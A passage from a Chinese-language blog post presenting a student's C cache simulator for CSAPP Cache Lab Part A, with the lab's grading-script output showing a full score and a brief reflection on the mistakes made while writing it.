class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div><div class="line">266</div><div class="line">267</div><div class="line">268</div><div class="line">269</div><div class="line">270</div><div class="line">271</div><div class="line">272</div><div class="line">273</div><div class="line">274</div><div class="line">275</div><div class="line">276</div><div class="line">277</div><div class="line">278</div><div class="line">279</div><div class="line">280</div><div class="line">281</div><div class="line">282</div><div class="line">283</div><div class="line">284</div><div class="line">285</div><div class="line">286</div><div class="line">287</div><div class="line">288</div><div class="line">289</div><div class="line">290</div><div class="line">291</div><div class="line">292</div><div class="line">293</div><div class="line">294</div><div class="line">295</div><div class="line">296</div><div class="line">297</div><div class="line">298</div><div class="line">299</div><div class="line">300</div><div class="line">301</div><div class="line">302</div><div class="line">303</div><div class="line">304</div><div class="line">305</div><div class="line">306</div><div class="line">307</div><div class="line">308</div><div class="line">309</div><div class="line">310</div><div class="line">311</div><div class="line">312</div><div class="line">313</div><div class="line">314</div><div class="line">315</div><div class="line">316</div><div class="line">317</div><div class="line">318</div><div class="line">319</div><div class="line">320</div><div class="line">321</div><div class="line">322</div><div class="line">323</div><div class="line">324</div><div class="line">325</div><div class="line">326</div><div class="line">327</div><div class="line">328</div><div class="line">329</div><div class="line">330</div><div class="line">331</div><div class="line">332</div><div class="line">333</div><div class="line">334</div><div class="line">335</div><div class="line">336</div><div class="line">337</div><div class="line">338</div><div class="line">339</div><div class="line">340</div><div class="line">341</div><div class="line">342</div><div class="line">343</div><div class="line">344</div><div class="line">345</div><div class="line">346</div><div class="line">347</div><div class="line">348</div><div class="line">349</div><div class="line">350</div><div class="line">351</div><div class="line">352</div><div class="line">353</div><div class="line">354</div><div class="line">355</div><div class="line">356</div><div class="line">357</div><div class="line">358</div><div class="line">359</div><div class="line">360</div><div class="line">361</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* include necessary headers */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"cachelab.h"</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"getopt.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdlib.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"unistd.h"</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"string.h"</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdint.h"</span></span></div><div class="line"></div><div class="line"><span class="comment">/* cache struct definition */</span></div><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CSim_Cache_Entry</span> &#123;</span></div><div class="line">    <span class="keyword">char</span> valid_bit;</div><div class="line">    <span class="keyword">uint64_t</span> tag_bit;</div><div class="line">&#125;CSim_Cache_Entry;</div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CSim_Cache_Set</span>&#123;</span></div><div class="line">    CSim_Cache_Entry * entries;</div><div class="line">&#125;CSim_Cache_Set;</div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CSim_Cache</span> &#123;</span></div><div class="line">    <span class="comment">/* basic arguments */</span></div><div class="line">    <span class="keyword">int</span> block_offset;</div><div class="line">    <span class="keyword">int</span> set_number;</div><div class="line">    <span class="keyword">int</span> line_number;</div><div class="line">    <span class="comment">/* masks and offsets */</span></div><div class="line">    <span class="keyword">int</span> tag_offset;</div><div class="line">    <span class="keyword">int</span> set_offset;</div><div class="line">    <span class="keyword">uint64_t</span> tag_mask;</div><div class="line">    <span class="keyword">uint64_t</span> set_mask;</div><div class="line">    <span class="comment">/* cache */</span></div><div class="line">    CSim_Cache_Set * sets;</div><div class="line">&#125;CSim_Cache;</div><div class="line"></div><div class="line"><span class="comment">/* simulation result definition */</span></div><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CSim_Cache_Result</span> &#123;</span></div><div class="line">    <span class="keyword">int</span> hit;</div><div class="line">    <span class="keyword">int</span> miss;</div><div class="line">    <span class="keyword">int</span> evict;</div><div class="line">&#125;CSim_Cache_Result;</div><div class="line"></div><div class="line"><span class="comment">/* operation type definition */</span></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> CSIM_OPERATION_TYPE &#123;</div><div class="line">    CSIM_OPERATION_TYPE_NONE,</div><div class="line">    CSIM_OPERATION_TYPE_MODIFY,</div><div class="line">    CSIM_OPERATION_TYPE_LOAD,</div><div class="line">    CSIM_OPERATION_TYPE_STORE,</div><div class="line">&#125;CSIM_OPERATION_TYPE;</div><div class="line"></div><div class="line"><span class="comment">/* operation result definition */</span></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> CSIM_OPERATION_RESULT &#123;</div><div class="line">    CSIM_OPERATION_RESULT_MISS,</div><div class="line">    CSIM_OPERATION_RESULT_HIT,</div><div class="line">    CSIM_OPERATION_RESULT_MISS_EVICTION,</div><div class="line">&#125;CSIM_OPERATION_RESULT;</div><div class="line"></div><div class="line"><span class="comment">/* error definition */</span></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> CSIM_ERROR &#123;</div><div class="line">    CSIM_OK = <span class="number">0</span>,</div><div class="line">    CSIM_ERROR_INVALID_OPTION,</div><div class="line">    CSIM_ERROR_MISSING_ARGUMENT,</div><div class="line">    CSIM_ERROR_FILE_CANNOT_OPEN,</div><div class="line">    CSIM_ERROR_OUT_OF_MEMORY,</div><div class="line">&#125;CSIM_ERROR;</div><div class="line"></div><div class="line"><span class="comment">/* macro definition for get a value given mask and offset */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> csim_get_value(number, mask, offset) (((number) &amp; (mask)) &gt;&gt; (offset))</span></div><div class="line"></div><div class="line"><span class="comment">/* function list */</span></div><div class="line"><span class="comment">/* message print functions */</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">csim_print_help_info</span><span class="params">()</span></span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">csim_error_missing_argument</span><span class="params">()</span></span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">csim_error_file_cannot_open</span><span class="params">()</span></span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">csim_error_out_of_memory</span><span class="params">()</span></span>;</div><div class="line"><span class="comment">/* cache structure related functions */</span></div><div class="line"><span class="function">CSim_Cache * <span class="title">csim_construct_cache</span><span class="params">(<span class="keyword">int</span> set_number, <span class="keyword">int</span> line_number, <span class="keyword">int</span> block_offset)</span></span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">csim_deconstruct_cache</span><span class="params">(CSim_Cache ** pcache)</span></span>;</div><div class="line"><span class="comment">/* cache simulation function */</span></div><div class="line"><span class="function">CSim_Cache_Result <span class="title">csim_parse_trace_file</span><span class="params">(CSim_Cache * cache, FILE * file_pointer, <span class="keyword">char</span> verbose_flag)</span></span>;</div><div class="line"></div><div class="line"><span class="comment">/* global variable */</span></div><div class="line"><span class="keyword">char</span> * program_name = <span class="literal">NULL</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">csim_print_help_info</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Usage: ./csim [-hv] -s &lt;num&gt; -E &lt;num&gt; -b &lt;num&gt; -t &lt;file&gt;\n"</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Options:\n"</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"  -h         Print this help message.\n"</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"  -v         Optional verbose flag.\n"</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"  -s &lt;num&gt;   Number of set index bits.\n"</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"  -E &lt;num&gt;   Number of lines per set.\n"</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"  -b &lt;num&gt;   Number of block offset bits.\n"</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"  -t &lt;file&gt;  Trace file.\n\n"</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Examples:\n"</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"  linux&gt;  ./csim -s 4 -E 1 -b 4 -t traces/yi.trace\n"</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"  linux&gt;  ./csim -v -s 8 -E 2 -b 4 -t traces/yi.trace\n"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">csim_error_missing_argument</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%s: Missing required command line argument\n"</span>, program_name);</div><div class="line">    csim_print_help_info();</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">csim_error_file_cannot_open</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%s: No such file or directory\n"</span>, program_name);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">csim_error_out_of_memory</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%s: Out of memory\n"</span>, program_name);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function">CSim_Cache * <span class="title">csim_construct_cache</span><span class="params">(<span class="keyword">int</span> set_number, <span class="keyword">int</span> line_number, <span class="keyword">int</span> block_offset)</span> </span>&#123;</div><div class="line">    <span class="comment">/* memory allocation */</span></div><div class="line">    CSim_Cache * cache = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(CSim_Cache));</div><div class="line">    <span class="keyword">if</span> (cache == <span class="literal">NULL</span>) &#123;</div><div class="line">        csim_error_out_of_memory();</div><div class="line">        <span class="built_in">exit</span>(CSIM_ERROR_OUT_OF_MEMORY);</div><div class="line">    &#125;</div><div class="line">    <span class="comment">/* configure basic arguments */</span></div><div class="line">    cache-&gt;set_number = set_number;</div><div class="line">    cache-&gt;line_number = line_number;</div><div class="line">    cache-&gt;block_offset = block_offset;</div><div class="line">    <span class="comment">/* caculate masks and offsets */</span></div><div class="line">    cache-&gt;tag_mask = ((<span class="keyword">uint64_t</span>)<span class="number">0xFFFFFFFFFFFFFFFF</span>) &lt;&lt; (block_offset + set_number);</div><div class="line">    cache-&gt;tag_offset = block_offset + set_number;</div><div class="line">    cache-&gt;set_mask = ((((((<span class="keyword">uint64_t</span>)<span class="number">0xFFFFFFFFFFFFFFFF</span>) &lt;&lt; (<span class="number">64</span> - cache-&gt;tag_offset)) &gt;&gt; (<span class="number">64</span> - cache-&gt;tag_offset)) &gt;&gt; block_offset) &lt;&lt; block_offset);</div><div class="line">    cache-&gt;set_offset = block_offset;</div><div class="line">    <span class="comment">/* memory allocation for cache */</span></div><div class="line">    cache-&gt;sets = <span class="built_in">calloc</span>((<span class="number">1</span> &lt;&lt; set_number), <span class="keyword">sizeof</span>(CSim_Cache_Set));</div><div class="line">    <span class="keyword">if</span> (cache-&gt;sets == <span class="literal">NULL</span>) &#123;</div><div class="line">        csim_error_out_of_memory();</div><div class="line">        <span class="built_in">exit</span>(CSIM_ERROR_OUT_OF_MEMORY);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> index = <span class="number">0</span> ; index &lt; (<span class="number">1</span> &lt;&lt; set_number) ; ++index) &#123;</div><div class="line">        (cache-&gt;sets)[index].entries = <span class="built_in">calloc</span>(line_number, <span class="keyword">sizeof</span>(CSim_Cache_Entry));</div><div class="line">        <span class="keyword">if</span> ((cache-&gt;sets)[index].entries == <span class="literal">NULL</span>) &#123;</div><div class="line">            csim_error_out_of_memory();</div><div class="line">            <span class="built_in">exit</span>(CSIM_ERROR_OUT_OF_MEMORY);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> cache;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">csim_deconstruct_cache</span><span class="params">(CSim_Cache ** pcache)</span> </span>&#123;</div><div class="line">    <span class="comment">/* release cache according to construct function */</span></div><div class="line">    CSim_Cache * temp = *pcache;</div><div class="line">    <span class="keyword">int</span> set_number = temp-&gt;set_number;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> index = <span class="number">0</span> ; index &lt; set_number ; ++index) &#123;</div><div class="line">        <span class="built_in">free</span>((temp-&gt;sets)[index].entries);</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">free</span>(temp-&gt;sets);</div><div class="line">    <span class="built_in">free</span>(temp);</div><div class="line">    *pcache = <span class="literal">NULL</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function">CSim_Cache_Result <span class="title">csim_parse_trace_file</span><span class="params">(CSim_Cache * cache, FILE * file_pointer, <span class="keyword">char</span> verbose_flag)</span> </span>&#123;</div><div class="line">    <span class="comment">/* file I/O related */</span></div><div class="line">    <span class="keyword">char</span> line[<span class="number">80</span>];</div><div class="line">    <span class="keyword">char</span> * line_pointer = <span class="literal">NULL</span>;</div><div class="line">    <span class="comment">/* cache type and cache result */</span></div><div class="line">    CSIM_OPERATION_TYPE type;</div><div class="line">    CSIM_OPERATION_RESULT result;</div><div class="line">    <span class="comment">/* address and set index &amp; tag bis from it */</span></div><div class="line">    <span class="keyword">int</span> address = <span class="number">0</span>;</div><div class="line">    <span class="keyword">int</span> <span class="built_in">set</span> = <span class="number">0</span>, tag = <span class="number">0</span>;</div><div class="line">    <span class="comment">/* line number */</span></div><div class="line">    <span class="keyword">int</span> line_number = cache-&gt;line_number;</div><div class="line">    <span class="comment">/* simulation result */</span></div><div class="line">    CSim_Cache_Result summary = &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;;</div><div class="line">    <span class="comment">/* parsing process */</span></div><div class="line">    <span class="keyword">while</span> (fgets(line, <span class="number">80</span>, file_pointer), feof(file_pointer) == <span class="number">0</span>) &#123;</div><div class="line">        line_pointer = line;</div><div class="line">        type = CSIM_OPERATION_TYPE_NONE;</div><div class="line">        <span class="comment">/* exclude instrction load */</span></div><div class="line">        <span class="keyword">if</span> (*line_pointer++ == <span class="string">' '</span>) &#123;</div><div class="line">            <span class="keyword">switch</span>(*line_pointer++) &#123;</div><div class="line">                <span class="keyword">case</span> <span class="string">'L'</span>:</div><div class="line">                    type = CSIM_OPERATION_TYPE_LOAD;</div><div class="line">                    <span class="keyword">if</span> (verbose_flag) &#123;</div><div class="line">                        <span class="built_in">putchar</span>(<span class="string">'L'</span>);</div><div class="line">                    &#125;</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">                <span class="keyword">case</span> <span class="string">'S'</span>:</div><div class="line">                    type = CSIM_OPERATION_TYPE_STORE;</div><div class="line">                    <span class="keyword">if</span> (verbose_flag) &#123;</div><div class="line">                        <span class="built_in">putchar</span>(<span class="string">'S'</span>);</div><div class="line">                    &#125;</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">                <span class="keyword">case</span> <span class="string">'M'</span>:</div><div class="line">                    type = CSIM_OPERATION_TYPE_MODIFY;</div><div class="line">                    <span class="keyword">if</span> (verbose_flag) &#123;</div><div class="line">                        <span class="built_in">putchar</span>(<span class="string">'M'</span>);</div><div class="line">                    &#125;</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">                <span class="keyword">default</span>:</div><div class="line">                    type = CSIM_OPERATION_TYPE_NONE;</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">            &#125;</div><div class="line">            result = CSIM_OPERATION_RESULT_MISS_EVICTION;</div><div class="line">            <span class="built_in">sscanf</span>(line_pointer, <span class="string">"%x"</span>, &amp;address);</div><div class="line">            <span class="keyword">if</span> (verbose_flag) &#123;</div><div class="line">                <span class="keyword">while</span> ((*line_pointer) != <span class="string">'\n'</span>) &#123;</div><div class="line">                    <span class="built_in">putchar</span>(*line_pointer++);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            <span class="comment">/* separate set and tag according to mask and offset */</span></div><div class="line">            <span class="built_in">set</span> = csim_get_value(address, cache-&gt;set_mask, cache-&gt;set_offset);</div><div class="line">            tag = csim_get_value(address, cache-&gt;tag_mask, cache-&gt;tag_offset);</div><div class="line">            <span class="comment">/* determine the cache result */</span></div><div class="line">            CSim_Cache_Entry * pentry = (cache-&gt;sets)[<span class="built_in">set</span>].entries;</div><div class="line">            <span class="keyword">int</span> index;</div><div class="line">            CSim_Cache_Entry temp;</div><div class="line">            <span class="keyword">for</span> (index = <span class="number">0</span>; index &lt; line_number ; ++index) &#123;</div><div class="line">                <span class="keyword">if</span> (!pentry[index].valid_bit) &#123;</div><div class="line">                    result = CSIM_OPERATION_RESULT_MISS;</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">                &#125;</div><div class="line">                <span class="keyword">if</span> (pentry[index].tag_bit == tag) &#123;</div><div class="line">                    result = CSIM_OPERATION_RESULT_HIT;</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            <span class="comment">/* simulate according to the result of cache behavior */</span></div><div class="line">            <span class="keyword">switch</span>(result) &#123;</div><div class="line">                <span class="keyword">case</span> CSIM_OPERATION_RESULT_MISS:</div><div class="line">                    <span class="keyword">if</span> (verbose_flag) &#123;</div><div class="line">                        <span class="built_in">printf</span>(<span class="string">" miss"</span>);</div><div class="line">                    &#125;</div><div class="line">                    pentry[index].valid_bit = <span class="number">1</span>;</div><div class="line">                    pentry[index].tag_bit = tag;</div><div class="line">                    summary.miss++;</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">                <span class="keyword">case</span> CSIM_OPERATION_RESULT_MISS_EVICTION:</div><div class="line">                    <span class="keyword">if</span> (verbose_flag) &#123;</div><div class="line">                        <span class="built_in">printf</span>(<span class="string">" miss eviction"</span>);</div><div class="line">                    &#125;</div><div class="line">                    pentry[<span class="number">0</span>].tag_bit = tag;</div><div class="line">                    temp = pentry[<span class="number">0</span>];</div><div class="line">                    <span class="keyword">for</span> (index = <span class="number">0</span> ; index &lt; line_number - <span class="number">1</span> ; ++index) &#123;</div><div class="line">                        pentry[index] = pentry[index + <span class="number">1</span>];</div><div class="line">                    &#125;</div><div class="line">                    pentry[index] = temp;</div><div class="line">                    summary.miss++;</div><div class="line">                    summary.evict++;</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">                <span class="keyword">case</span> CSIM_OPERATION_RESULT_HIT:</div><div class="line">                    <span class="keyword">if</span> (verbose_flag) &#123;</div><div class="line">                        <span class="built_in">printf</span>(<span class="string">" hit"</span>);</div><div class="line">                    &#125;</div><div class="line">                    temp = pentry[index];</div><div class="line">                    <span class="keyword">for</span> ( ; (index &lt; line_number - <span class="number">1</span>) &amp;&amp; (pentry[index + <span class="number">1</span>].valid_bit) ; ++index) &#123;</div><div class="line">                        pentry[index] = pentry[index + <span class="number">1</span>];</div><div class="line">                    &#125;</div><div class="line">                    pentry[index] = temp;</div><div class="line">                    summary.hit++;</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">if</span> (type == CSIM_OPERATION_TYPE_MODIFY) &#123;</div><div class="line">                <span class="keyword">if</span> (verbose_flag) &#123;</div><div class="line">                    <span class="built_in">printf</span>(<span class="string">" hit"</span>);</div><div class="line">                &#125;</div><div class="line">                summary.hit++;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">if</span> (verbose_flag) &#123;</div><div class="line">                <span class="built_in">putchar</span>(<span class="string">'\n'</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> summary;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</div><div class="line">    <span class="comment">/* variables for argument parsing */</span></div><div class="line">    <span class="keyword">char</span> h = <span class="number">0</span>, v = <span class="number">0</span>, s = <span class="number">0</span>, E = <span class="number">0</span>, b = <span class="number">0</span>, t = <span class="number">0</span>;</div><div class="line">    <span class="keyword">int</span> opt;</div><div class="line">    <span class="comment">/* cache arguments */</span></div><div class="line">    <span class="keyword">int</span> set_number = <span class="number">0</span>, line_number = <span class="number">0</span>, block_offset = <span class="number">0</span>;</div><div class="line">    <span class="comment">/* cache */</span></div><div class="line">    CSim_Cache * cache = <span class="literal">NULL</span>;</div><div class="line">    <span class="comment">/* file path */</span></div><div class="line">    <span class="keyword">char</span> file_path[<span class="number">80</span>];</div><div class="line">    <span class="comment">/* verbose flag */</span></div><div class="line">    <span class="keyword">char</span> verbose_flag = <span class="number">0</span>;</div><div class="line">    <span class="comment">/* summary */</span></div><div class="line">    CSim_Cache_Result summary = &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;;</div><div class="line">    <span class="comment">/* pre-operation */</span></div><div class="line">    program_name = argv[<span class="number">0</span>];</div><div class="line">    <span class="comment">/* argument parsing */</span></div><div class="line">    <span class="keyword">while</span> ((opt = getopt(argc, argv, <span class="string">"hvs:E:b:t:"</span>)) != <span class="number">-1</span>) &#123;</div><div class="line">        <span class="keyword">switch</span>(opt) &#123;</div><div class="line">            <span class="keyword">case</span> <span class="string">'h'</span>:</div><div class="line">                h = <span class="number">1</span>;</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">case</span> <span class="string">'v'</span>:</div><div class="line">                v = <span class="number">1</span>;</div><div class="line">                verbose_flag = <span class="number">1</span>;</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">case</span> <span class="string">'s'</span>:</div><div class="line">                set_number = atoi(optarg);</div><div class="line">                <span class="keyword">if</span> (set_number == <span class="number">0</span>) &#123;</div><div class="line">                    csim_error_missing_argument();</div><div class="line">                    <span class="keyword">return</span> CSIM_ERROR_MISSING_ARGUMENT;</div><div class="line">                &#125;</div><div class="line">                s = <span class="number">1</span>;</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">case</span> <span class="string">'E'</span>:</div><div class="line">                line_number = atoi(optarg);</div><div class="line">                <span class="keyword">if</span> (line_number == <span class="number">0</span>) &#123;</div><div class="line">                    csim_error_missing_argument();</div><div class="line">                    <span class="keyword">return</span> CSIM_ERROR_MISSING_ARGUMENT;</div><div class="line">                &#125;</div><div class="line">                E = <span class="number">1</span>;</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">case</span> <span class="string">'b'</span>:</div><div class="line">                block_offset = atoi(optarg);</div><div class="line">                <span class="keyword">if</span> (block_offset == <span class="number">0</span>) &#123;</div><div class="line">                    csim_error_missing_argument();</div><div class="line">                    <span class="keyword">return</span> CSIM_ERROR_MISSING_ARGUMENT;</div><div class="line">                &#125;</div><div class="line">                b = <span class="number">1</span>;</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">case</span> <span class="string">'t'</span>:</div><div class="line">                t = <span class="number">1</span>;</div><div class="line">                <span class="built_in">strcpy</span>(file_path, optarg);</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">default</span>:</div><div class="line">                csim_print_help_info();</div><div class="line">                <span class="keyword">return</span> CSIM_ERROR_INVALID_OPTION;</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (h == <span class="number">1</span>) &#123;</div><div class="line">        csim_print_help_info();</div><div class="line">        <span class="keyword">return</span> CSIM_OK;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (v == <span class="number">1</span>) &#123;</div><div class="line">        verbose_flag = <span class="number">1</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (!(s == <span class="number">1</span> &amp;&amp; E == <span class="number">1</span> &amp;&amp; b == <span class="number">1</span> &amp;&amp; t == <span class="number">1</span>)) &#123;</div><div class="line">        csim_error_missing_argument();</div><div class="line">        <span class="keyword">return</span> CSIM_ERROR_MISSING_ARGUMENT;</div><div class="line">    &#125;</div><div class="line">    <span class="comment">/* file processing */</span></div><div class="line">    FILE * file_pointer = fopen(file_path, <span class="string">"r"</span>);</div><div class="line">    <span class="keyword">if</span> (file_pointer == <span class="literal">NULL</span>) &#123;</div><div class="line">        csim_error_file_cannot_open(file_path);</div><div class="line">        <span class="keyword">return</span> CSIM_ERROR_FILE_CANNOT_OPEN;</div><div class="line">    &#125;</div><div class="line">    <span class="comment">/* cache construction */</span></div><div class="line">    cache = csim_construct_cache(set_number, line_number, block_offset);</div><div class="line">    <span class="comment">/* trace file parsing */</span></div><div class="line">    summary = csim_parse_trace_file(cache, file_pointer, verbose_flag);</div><div class="line">    <span class="comment">/* summary */</span></div><div class="line">    printSummary(summary.hit, summary.miss, summary.evict);</div><div class="line">    <span class="comment">/* post operations */</span></div><div class="line">    csim_deconstruct_cache(&amp;cache);</div><div class="line">    fclose(file_pointer);</div><div class="line">    <span class="keyword">return</span> CSIM_OK;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h2><p>自动评分脚本给出的输出如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">user@blackdragon ~/C/C/cachelab-handout&gt; ./<span class="built_in">test</span>-csim</div><div class="line">                        Your simulator     Reference simulator</div><div class="line">Points (s,E,b)    Hits  Misses  Evicts    Hits  Misses  Evicts</div><div class="line">     3 (1,1,1)       9       8       6       9       8       6  traces/yi2.trace</div><div class="line">     3 (4,2,4)       4       5       2       4       5       2  traces/yi.trace</div><div class="line">     3 (2,1,4)       2       3       1       2       3       1  traces/dave.trace</div><div class="line">     3 (2,1,3)     167      71      67     167      71      67  traces/trans.trace</div><div class="line">     3 (2,2,3)     201      37      29     201      37      29  traces/trans.trace</div><div class="line">     3 (2,4,3)     212      26      10     212      26      10  traces/trans.trace</div><div class="line">     3 (5,1,5)     231       7       0     231       7       0  traces/trans.trace</div><div class="line">     6 (5,1,5)  265189   21775   21743  265189   21775   21743  traces/long.trace</div><div class="line">    27</div><div class="line"></div><div class="line">TEST_CSIM_RESULTS=27</div></pre></td></tr></table></figure></p>
<h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h2><p>由于在寒假的课程设计中已经使用过了命令行参数解析以及复杂的数据结构设计与实验，Part A总体上来说不是很难，我主要的精力花费在代码风格上，希望代码能尽量具有良好的架构以及可读性。</p>
<p>本部分中犯的错误有，直接根据s设置缓存的组数，而实际上的组数是2^s个。循环中由于手误导致出现死循环。没有搞清楚inline static关键字而导致的编译错误等等。存在知识的盲区也存在着粗心导致的错误，以后还需要更加注意。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;实验答案托管在我的&lt;a href=&quot;https://github.com/BlackDragonF/CSAPPLabs/tree/master/CacheLab&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;GitHub&lt;/a&gt;上&lt;/p&gt;
&lt;blockqu
    
    </summary>
    
      <category term="计算机系统" scheme="http://blog.codedragon.tech/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="实验" scheme="http://blog.codedragon.tech/tags/%E5%AE%9E%E9%AA%8C/"/>
    
